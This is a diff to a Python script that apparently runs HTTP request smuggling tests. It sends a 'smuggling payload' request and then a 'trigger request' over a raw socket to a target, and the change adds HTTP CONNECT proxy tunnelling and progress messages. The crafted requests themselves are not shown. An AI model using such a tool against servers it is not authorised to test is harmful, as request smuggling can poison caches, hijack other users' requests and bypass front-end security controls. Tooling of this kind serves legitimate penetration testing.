@@ -8,13 +8,24 @@ def load_request(path):
         return f.read()
 
 def connect(host, port, use_ssl=False, proxy_host=None, proxy_port=None):
-    target_host = proxy_host if proxy_host else host
-    target_port = proxy_port if proxy_host else port
-
-    sock = socket.create_connection((target_host, target_port))
+    if proxy_host:
+        # Connect to the proxy
+        sock = socket.create_connection((proxy_host, proxy_port))
+        # Send HTTP CONNECT request to establish the tunnel
+        connect_request = f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}\r\n\r\n"
+        sock.sendall(connect_request.encode())
+        response = sock.recv(4096)  # Read proxy response
+        if b"200 Connection established" not in response:
+            print("Failed to establish connection through proxy")
+            sys.exit(1)
+    else:
+        # Connect directly to the target
+        sock = socket.create_connection((host, port))
+    
     if use_ssl:
         context = ssl.create_default_context()
         sock = context.wrap_socket(sock, server_hostname=host)
+
     return sock
 
 def main():
@@ -45,9 +56,11 @@ def main():
     try:
         sock = connect(host, port, use_ssl, proxy_host, proxy_port)
 
-        sock.sendall(req1)
-        time.sleep(1)
-        sock.sendall(req2)
+        print("Sending first request (smuggling payload)...")
+        sock.sendall(req1)  # Send first request (smuggling request)
+        time.sleep(1)  # Wait before sending the second request
+        print("Sending second request (trigger request)...")
+        sock.sendall(req2)  # Send second request (trigger request)
 
         sock.settimeout(5.0)
         response = b''
@@ -60,6 +73,7 @@ def main():
         except socket.timeout:
             pass
 
+        print("Response from server:\n")
         print(response.decode('utf-8', errors='replace'))
 
     except Exception as e:
